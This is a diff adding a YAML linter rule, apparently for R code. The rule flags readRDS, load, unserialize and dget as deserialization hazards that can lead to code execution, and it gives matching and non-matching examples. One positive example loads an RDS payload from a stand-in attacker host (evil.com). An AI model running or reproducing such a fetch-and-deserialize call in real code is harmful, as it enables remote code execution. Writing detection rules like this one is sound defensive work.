@@ -1,0 +1,36 @@
+name: deserialization_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1059
+  - T1195.002
+message: >-
+  readRDS(), load(), unserialize(), and dget() deserialize R objects or code,
+  which can enable arbitrary code execution (CVE-2024-27322 for RDS).
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'readRDS' or text() = 'load' or text() = 'unserialize'
+      or text() = 'dget'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    readRDS(url("https://evil.com/payload.rds"))
+  - |
+    readRDS("payload.rds")
+  - |
+    load("payload.rda")
+  - |
+    unserialize(raw_bytes)
+  - |
+    dget("payload.R")
+negative_examples:
+  - |
+    foo$readRDS("x")
+  - |
+    foo@load("x")
+  - |
+    foo$unserialize(x)
